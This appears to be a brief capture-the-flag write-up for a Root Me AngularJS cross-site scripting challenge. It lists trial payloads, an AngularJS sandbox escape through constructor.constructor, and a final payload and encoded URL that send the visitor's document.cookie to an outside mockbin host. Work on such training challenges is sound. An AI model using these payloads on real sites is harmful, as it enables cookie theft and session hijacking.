# XSS - AngularJS

## Initial Attempt

```javascript
'; alert(1); var s='
```

Problem: quotes are removed from the input, and so are the angular brackets

## Constructor via Angular

Achieve XSS through this payload

```javascript
{{constructor.constructor("alert(1)")()}}
```

Replace with fetch mockbin

```javascript
{{constructor.constructor("fetch('https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/')")()}}
```

Problem: [SyntaxError:] missing ) after argument list. I do not know what this means honestly.

## Classic document location

So, I had to experiment a bit with escaping the quotes and all, this payload seems to do the trick

```javascript
{{constructor.constructor(&#x27;document.location="https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/"+document.cookie&#x27;)()}}
```

Payload

```text
http://challenge01.root-me.org/web-client/ch35/index.php?name=%7B%7Bconstructor.constructor%28%26%23x27%3Bdocument.location%3D%22https%3A%2F%2Fb5e02d613ca44b7384e0290125a1448e.api.mockbin.io%2F%22%2Bdocument.cookie%26%23x27%3B%29%28%29%7D%7D
```
